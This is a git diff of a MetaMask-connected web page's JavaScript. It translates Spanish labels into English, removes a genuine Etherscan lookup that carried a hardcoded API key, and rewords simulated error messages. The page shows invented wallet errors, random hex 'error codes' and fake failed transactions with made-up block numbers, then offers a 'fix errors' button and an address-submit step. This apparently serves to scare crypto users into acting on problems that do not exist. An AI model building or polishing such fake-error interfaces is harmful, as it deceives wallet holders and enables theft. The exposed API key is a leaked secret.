@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', async () => {
 
         setTimeout(() => {
             clearInterval(loadingInterval);
-            addressStatus.textContent = 'Status Address: Con errores';
+            addressStatus.textContent = 'Status Address: Error 1-92ErrTx8365';
             addressStatus.style.color = 'red';
             // Mostrar botón "Corregir errores" después de mostrar errores
             fixErrorsButton.style.display = 'block';
@@ -39,10 +39,10 @@ document.addEventListener('DOMContentLoaded', async () => {
             // Solicitar al usuario que conecte MetaMask
             const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
             // Cambiar el texto del botón a Web3 Activo
-            connectButton.textContent = 'Web3 Activo';
+            connectButton.textContent = 'Web3 Active';
             // Mostrar la dirección resumida del usuario
             if (accounts.length > 0) {
-                userAddress.textContent = `Dirección: ${summarizeAddress(accounts[0])}`;
+                userAddress.textContent = `Address: ${summarizeAddress(accounts[0])}`;
                 // Simular el estado de la dirección
                 simulateAddressStatus();
             }
@@ -58,8 +58,8 @@ document.addEventListener('DOMContentLoaded', async () => {
     // Escuchar cambios en las cuentas y actualizar la interfaz
     ethereum.on('accountsChanged', (accounts) => {
         if (accounts.length > 0) {
-            userAddress.textContent = `Dirección: ${summarizeAddress(accounts[0])}`;
-            connectButton.textContent = 'Web3 Activo';
+            userAddress.textContent = `Address: ${summarizeAddress(accounts[0])}`;
+            connectButton.textContent = 'Web3 Active';
             simulateAddressStatus();
         } else {
             userAddress.textContent = '';
@@ -99,23 +99,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     });
 
 
-    async function fetchLatestTransactions(address) {
-    const apiKey = 'GJ83EZQPDGWDE9BC37RP9YTRY7MR2G9AM3';
-    const url = `https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=10&sort=desc&apikey=${apiKey}`;
-
-    try {
-        const response = await fetch(url);
-        const data = await response.json();
-        if (data.status === "1") {
-            displayTransactions(data.result);
-        } else {
-            console.error('Error al obtener las transacciones:', data.result);
-        }
-    } catch (error) {
-        console.error('Error al realizar la solicitud a Etherscan:', error);
-    }
-}
-
+   
 
 
     
@@ -125,7 +109,7 @@ document.addEventListener('DOMContentLoaded', async () => {
 
         const failedTransactionsBody = document.getElementById('failedTransactionsBody');
         // Limpiamos el contenido previo que pueda existir.
-        failedTransactionsBody.innerHTML = '<tr><td colspan="3">Cargando...</td></tr>';
+        failedTransactionsBody.innerHTML = '<tr><td colspan="3">Process...</td></tr>';
         
         setTimeout(() => {
             failedTransactionsBody.innerHTML = ''; // Limpiar "Cargando..."
@@ -154,15 +138,15 @@ document.addEventListener('DOMContentLoaded', async () => {
     function generateErrorMessage(level) {
         // Genera mensajes de error/warning de ejemplo con códigos hexadecimales.
         if (level === 'error') {
-            return `Error: Gas insuficiente - Código 0x${Math.floor(Math.random() * 256).toString(16)}`;
+            return `Error: Estimate Gas fail - Code error 0x${Math.floor(Math.random() * 256).toString(16)}`;
         } else {
-            return `Warning: Posible reentrancia - Código 0x${Math.floor(Math.random() * 256).toString(16)}`;
+            return `Warning: Gas low E-Tx - Code error 0x${Math.floor(Math.random() * 256).toString(16)}`;
         }
     }
 
     function generateBlockNumber() {
         // Genera un número de bloque aleatorio.
-        return `Bloque #${Math.floor(100000 + Math.random() * 900000)}`;
+        return `Block #${Math.floor(100000 + Math.random() * 900000)}`;
     }
     // Función para manejar el envío de la dirección
     submitAddressButton.addEventListener('click', () => {
